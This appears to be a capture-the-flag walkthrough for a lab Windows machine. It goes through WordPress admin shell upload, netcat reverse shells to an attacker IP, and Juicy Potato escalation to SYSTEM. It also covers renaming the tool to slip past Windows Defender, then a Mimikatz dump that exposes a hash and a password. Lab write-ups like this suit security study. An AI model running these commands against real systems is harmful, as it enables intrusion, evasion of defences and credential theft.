### Enumeration
After networking enumeration, go visit website `http://10.10.10.29` and see it's a website hosted by Window Server

Use `gobuster` to find directories in web server:

```gobuster dir -u "http://10.10.10.29" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt```

-> Find a directory called `/wordpress` 

 Investigate `/wordpress` and found `wp-login.php` entry page.
 
 Use credentials `admin:P@s5w0rd!` that we found on previous machine (DB user)
 
### Exploitation

Use ***Metasploit*** -> open `msfconsole` to search for module `search -f wordpress admin shell` 

`use exploit/unix/webapp/wp_admin_shell_upload` 

This command give us a reverse TCP shell (PHP)

```meterpreter> sysinfo``` -> Gave us information about the Window machine (Window Server 2016)

We see that this is a rather old Windows Server version. Let's see if it has any know vulnerabilities regarding privilege escalation.

And indeed! It's called `Rotten Potato` [docs](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/). For our case, we will use a slight modification of that exploit called `Juicy Potato` [Github](https://github.com/ohpe/juicy-potato/).

### Upload NetCat

Start Netcat listener in your machine
`nc -lvp 1338` 

Download `nc.exe` from [here](https://github.com/int0x33/nc.exe/blob/master/nc.exe). Change directory in meterpreter session to

`C:/inetpub/wwwroot/wordpress/wp-content/uploads`

Upload the `nc.exe` file from your machine to Window victim machine. 

`upload nc.exe` 

Execute nc.exe

` execute -f nc.exe -a "-e cmd.exe 10.10.16.6 1338"`

You should see a Window Powershell in your terminal (from Netcat listener)

### Privilege Escalation ( Juicy Potato exploit)

Start another Netcat listener
`nc -lvp 1339`

We can create a batch file that will be executed by the exploit and return a SYSTEM shell. Let's add the following contents to `shell.bat` (run it from the nc reverse shell).

`echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.16.6 1339 > shell.bat`

Upload Juicy Potato exe to window victim machine (use uncommon name) so window defender don't detect it.

Execute `jp.exe` with `shell.bat`:

`jp.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337`

-> you should have SYSTEM ADMIN shell in your Netcat session

Type `whoami` to check

-> `NT AUTHORITY\System` 

root.txt flag is in `C:\Users\Administrator\Desktop`

### Post Exploitation

Mimikatz can be used to find additional cached passwords on the machine. This might be useful for the next challenge.

So we upload the exe from the meterpreter session and execute it:

`meterpreter > upload mimikatz.exe`

Then do following in the System shell:

`$ .\mimikatz.exe`

`$ mimikatz> sekurlsa::logonpasswords`

...

Authentication Id : 0 ; 216075 (00000000:00034c0b)                                       
Session           : Interactive from 1
User Name         : sandra
Domain            : MEGACORP
Logon Server      : PATHFINDER
Logon Time        : 1/4/2021 11:12:16 AM
SID               : S-1-5-21-1035856440-4137329016-3276773158-1105                       
        msv :                               
         [00000003] Primary
         * Username : sandra
         * Domain   : MEGACORP
         * NTLM     : 29ab86c5c4d2aab957763e5c1720486d                                   
         * SHA1     : 8bd0ccc2a23892a74dfbbbb57f0faa9721562a38                           
         * DPAPI    : f4c73b3f07c4f309ebf086644254bcbc                                   
        tspkg :                             
        wdigest :                           
         * Username : sandra
         * Domain   : MEGACORP
         * Password : (null)
        kerberos :                          
         * Username : sandra                <-- USERNAME
         * Domain   : MEGACORP.LOCAL
         * Password : Password1234!         <-- PASSWORD
        ssp :                               
        credman : 
        
...
The found credentials are sandra:Password1234!.
